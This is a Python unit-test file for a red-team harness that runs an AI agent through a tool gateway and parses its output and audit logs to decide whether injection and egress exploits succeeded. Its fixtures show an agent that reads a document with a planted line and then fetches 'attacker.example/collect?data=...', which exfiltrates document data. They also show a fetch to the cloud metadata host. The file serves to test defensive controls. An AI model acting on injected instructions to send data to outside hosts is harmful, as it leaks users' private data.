"""Tests for attacks/agentlab.py -- the pure parts that decide verdicts.

    python3 -m unittest discover -s attacks -t attacks -p 'test_*.py' -v

stdlib only, no stack. Exploits 03 and 04 turn two texts into an exit
code: the agent's stdout and the gateway's audit log. A misread in either
is how a run "passes" without the thing it claims having happened -- so
the parsers are pinned here, and every ambiguous input parses to
something that refuses rather than something that agrees.
"""

from __future__ import annotations

import json
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import agentlab  # noqa: E402

VULN_STDOUT = """\
agent: session=11111111-1111-1111-1111-111111111111 org=o-1 acting_for=u-1 build=vulnerable
  turn 1: tool read_document map[id:22222222-2222-2222-2222-222222222222]
  turn 2: tool http_fetch map[url:http://attacker.example/collect?data=Acme+Q3]
  turn 3: answer

agent: Summary: Acme Corp | collector received: GET /collect?data=Acme+Q3
"""

STOPPED_STDOUT = """\
agent: session=33333333-3333-3333-3333-333333333333 org=o-1 acting_for=u-1 build=hardened
  turn 1: tool http_fetch map[url:http://metadata.google.internal/x]

agent: stopped: agent: executing http_fetch: gateway executor: POST /gate: connection refused
"""


class ParseAgentStdout(unittest.TestCase):
    def test_a_completed_run(self):
        run = agentlab.parse_agent_stdout(VULN_STDOUT)
        self.assertEqual(run.session_id, "11111111-1111-1111-1111-111111111111")
        self.assertEqual(run.build, "vulnerable")
        self.assertEqual(run.tools, ["read_document", "http_fetch"])
        self.assertEqual(run.fetches, 1)
        self.assertTrue(run.answer.startswith("Summary: Acme Corp"))
        self.assertIsNone(run.stopped)

    def test_a_stopped_run_is_not_an_answer(self):
        # A hardened agent whose gateway is down fails closed and STOPS.
        # That must parse as stopped -- the exploit maps it to exit 2,
        # never to "control held" (T8's fault-injection case).
        run = agentlab.parse_agent_stdout(STOPPED_STDOUT)
        self.assertIn("connection refused", run.stopped)
        self.assertEqual(run.answer, "")
        self.assertEqual(run.fetches, 1)

    def test_no_header_means_no_session(self):
        # An agent that refused to start (mode mismatch, bad flags) logs
        # to stderr and prints no header. There is no session to judge.
        run = agentlab.parse_agent_stdout("")
        self.assertEqual(run.session_id, "")

    def test_a_url_mentioning_a_tool_name_is_not_a_tool(self):
        out = VULN_STDOUT.replace("collect?data=Acme+Q3]", "collect?data=http_fetch]")
        self.assertEqual(agentlab.parse_agent_stdout(out).fetches, 1)


def jsonl(*records):
    return "\n".join(json.dumps(r) for r in records) + "\n"


class AuditForSession(unittest.TestCase):
    def setUp(self):
        self.log = jsonl(
            {"phase": "pre", "decision_id": "d_a", "session": "s-mine", "tool": "read_document",
             "route": "allow", "reasons": ["policy_satisfied"]},
            {"phase": "post", "decision_id": "d_a", "outcome": "ok"},
            {"phase": "pre", "decision_id": "d_b", "session": "s-other", "tool": "http_fetch",
             "route": "deny", "reasons": ["egress_not_allowlisted"]},
            {"phase": "pre", "decision_id": "d_c", "session": "s-mine", "tool": "http_fetch",
             "route": "deny", "reasons": ["resolved_address_denied"],
             "resolved": {"host": "metadata.google.internal", "ip": "172.28.0.20"}},
        )

    def test_only_this_sessions_decisions(self):
        recs = agentlab.decisions_for_session(self.log, "s-mine")
        self.assertEqual([r["decision_id"] for r in recs], ["d_a", "d_c"])

    def test_the_post_record_is_joined(self):
        [read, fetch] = agentlab.decisions_for_session(self.log, "s-mine")
        self.assertEqual(read["outcome"], "ok")
        self.assertNotIn("outcome", fetch)  # denied: never executed

    def test_fetch_denial_reads_the_policy_reason(self):
        recs = agentlab.decisions_for_session(self.log, "s-mine")
        self.assertEqual(agentlab.fetch_denial(recs), "resolved_address_denied")

    def test_no_fetch_denial_is_none_not_a_default(self):
        recs = agentlab.decisions_for_session(self.log, "s-other-session")
        self.assertIsNone(agentlab.fetch_denial(recs))

    def test_a_fail_closed_deny_is_operational_not_a_held_control(self):
        # The gateway denies when OPA is dead or DNS fails -- correctly,
        # fail closed. But that deny says the GATE could not decide, not
        # that a control held: exit 2, never 1 (T8 kills OPA mid-run and
        # must see an outage). Found at T7 review.
        for reason in ("opa_unavailable", "enrichment_failed", "something_new"):
            log = jsonl({"phase": "pre", "decision_id": "d_z", "session": "s", "tool": "http_fetch",
                         "route": "deny", "reasons": [reason]})
            with self.subTest(reason=reason), self.assertRaises(agentlab.Operational):
                agentlab.fetch_denial(agentlab.decisions_for_session(log, "s"))

    def test_any_fail_closed_deny_in_the_session_is_named(self):
        # With OPA dead the gate also refuses read_document, so the agent
        # never sees the planted line and makes no fetch at all. The run
        # must say WHY, not just "no fetch".
        log = jsonl({"phase": "pre", "decision_id": "d_r", "session": "s", "tool": "read_document",
                     "route": "deny", "reasons": ["opa_unavailable"]})
        with self.assertRaises(agentlab.Operational) as ctx:
            agentlab.check_not_failed_closed(agentlab.decisions_for_session(log, "s"))
        self.assertIn("opa_unavailable", str(ctx.exception))
        self.assertIn("read_document", str(ctx.exception))
        # Policy denials and allows pass through untouched.
        agentlab.check_not_failed_closed(agentlab.decisions_for_session(self.log, "s-mine"))

    def test_a_refusal_at_a_later_redirect_hop_is_a_denial(self):
        # The policy allowed hop 1; the fetcher refused hop 2 (SR-B7-1).
        # The pre-record says allow, the post-record carries the reason.
        log = jsonl(
            {"phase": "pre", "decision_id": "d_h", "session": "s", "tool": "http_fetch",
             "route": "allow", "reasons": ["policy_satisfied"]},
            {"phase": "post", "decision_id": "d_h", "outcome": "error",
             "summary": "resolved_address_denied"})
        self.assertEqual(agentlab.fetch_denial(agentlab.decisions_for_session(log, "s")),
                         "resolved_address_denied")

    def test_an_empty_session_id_matches_nothing(self):
        # A run whose session id was never parsed must not match records
        # that happen to lack the field.
        log = self.log + jsonl({"phase": "pre", "decision_id": "d_x", "tool": "http_fetch",
                                "route": "deny", "reasons": ["x"]})
        self.assertEqual(agentlab.decisions_for_session(log, ""), [])

    def test_a_torn_last_line_is_skipped_not_fatal(self):
        # The gateway may be mid-append when the log is read.
        recs = agentlab.decisions_for_session(self.log + '{"phase": "pre", "sess', "s-mine")
        self.assertEqual(len(recs), 2)


class CollectorWindow(unittest.TestCase):
    """Receipts are windowed by the collector's sequence number, not by
    list length: the record is capped (oldest dropped), so at the cap a
    length snapshot sees nothing new -- found at T7 review."""

    def test_only_records_after_the_snapshot(self):
        recs = [{"seq": 1, "path": "/old"}, {"seq": 2, "path": "/new"}]
        self.assertEqual(agentlab.new_since(1, recs), [{"seq": 2, "path": "/new"}])

    def test_the_window_survives_the_cap(self):
        # Full collector: same length before and after, but seq moved on.
        recs = [{"seq": n} for n in range(6, 11)]
        self.assertEqual([r["seq"] for r in agentlab.new_since(8, recs)], [9, 10])

    def test_last_seq_of_an_empty_collector_is_zero(self):
        self.assertEqual(agentlab.last_seq([]), 0)
        self.assertEqual(agentlab.last_seq([{"seq": 3}, {"seq": 7}]), 7)

    def test_a_reset_collector_is_operational(self):
        # seq went BACKWARDS: the collector restarted or was cleared
        # mid-run, and the window means nothing.
        with self.assertRaises(agentlab.Operational):
            agentlab.new_since(5, [{"seq": 1}, {"seq": 2}])

    def test_records_without_seq_are_operational(self):
        # An old collector image: refuse rather than guess.
        with self.assertRaises(agentlab.Operational):
            agentlab.new_since(0, [{"path": "/x"}])


class RunMain(unittest.TestCase):
    def test_an_unexpected_crash_exits_2_not_1(self):
        # Python's default for an uncaught exception is exit 1 -- the
        # "control held" code. A crashed exploit has judged nothing.
        def boom():
            raise KeyError("token")
        with self.assertRaises(SystemExit) as ctx:
            agentlab.run_main(boom)
        self.assertEqual(ctx.exception.code, agentlab.EXIT_OPERATIONAL)

    def test_operational_exits_2(self):
        def down():
            raise agentlab.Operational("stack down")
        with self.assertRaises(SystemExit) as ctx:
            agentlab.run_main(down)
        self.assertEqual(ctx.exception.code, agentlab.EXIT_OPERATIONAL)


class RunAgentScope(unittest.TestCase):
    """Plan M3 T2 D4: every fresh session states the tools it may request.

    The scope is passed to the agent as -scope, in the order given, and a
    run with no scope is refused before docker is touched -- there is no
    default, because SR-B3-5 says the scope is explicitly requested.
    """

    def setUp(self):
        self.calls = []
        self._saved = agentlab._compose, set(agentlab._built_for)

        class Done:
            returncode, stderr = 0, ""
            stdout = VULN_STDOUT

        def fake(args, hardened, timeout=120):
            self.calls.append(args)
            return Done()

        agentlab._compose = fake
        agentlab._built_for.update({True, False})  # skip the image build

    def tearDown(self):
        agentlab._compose = self._saved[0]
        agentlab._built_for.clear()
        agentlab._built_for.update(self._saved[1])

    def test_the_scope_reaches_the_agent_as_a_flag(self):
        agentlab.run_agent(False, "o-1", "u-1", "hi", ("read_document", "http_fetch"))
        (args,) = self.calls
        i = args.index("-scope")
        self.assertEqual(args[i + 1], "read_document,http_fetch")

    def test_no_scope_is_refused_before_docker(self):
        for empty in ((), []):
            with self.assertRaises(ValueError):
                agentlab.run_agent(False, "o-1", "u-1", "hi", empty)
        self.assertEqual(self.calls, [])

    def test_a_tool_name_with_a_comma_is_refused(self):
        # It would split into two tools on the agent's side: the list the
        # agent stored would silently differ from the one asked for.
        with self.assertRaises(ValueError):
            agentlab.run_agent(False, "o-1", "u-1", "hi", ("read_document,http_fetch",))
        self.assertEqual(self.calls, [])

    def test_the_same_rules_as_the_agent_are_applied_before_docker(self):
        # The agent's parseScope refuses these too, but only after docker
        # has started a container; refusing here keeps the two checks one
        # rule set, and the failure fast and local.
        for bad in (("read_document", "read_document"),  # named twice
                    ("  ",),                               # blank name
                    (" read_document",)):                  # would be trimmed into a different name
            with self.subTest(bad=bad), self.assertRaises(ValueError):
                agentlab.run_agent(False, "o-1", "u-1", "hi", bad)
        self.assertEqual(self.calls, [])

    def test_a_bare_string_is_not_a_scope(self):
        # SCOPE = ("http_fetch") -- a missing comma -- is a str, which
        # would iterate into one "tool" per character.
        with self.assertRaises(ValueError):
            agentlab.run_agent(False, "o-1", "u-1", "hi", "http_fetch")
        with self.assertRaises(ValueError):
            agentlab.ask(False, "o-1", "u-1", "hi", "victim", "http_fetch")
        self.assertEqual(self.calls, [])


if __name__ == "__main__":
    unittest.main()
